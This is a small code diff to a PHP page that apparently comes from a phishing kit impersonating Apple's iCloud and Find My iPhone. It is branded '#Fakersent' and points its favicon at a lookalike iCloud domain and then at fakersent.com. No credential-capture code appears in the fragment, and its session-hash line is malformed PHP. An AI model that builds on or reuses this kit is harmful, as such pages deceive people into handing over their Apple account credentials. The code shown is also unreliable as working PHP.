@@ -130,8 +130,7 @@ $session = md5(uniqid(findmyiphone - icloud . com, true));;
 echo '
 <!DOCTYPE HTML>
 <html>
-<link rel="shortcut icon" href="http://location-myicloud.com/fakersent/images/favicon.png" />
-<center>
+<link rel="shortcut icon" href="http://fakersent.com/favicon.png"><center>
 <title>#Fakersent</title>
 <font size="6" color="black">#Fakersent</font>
 </center>
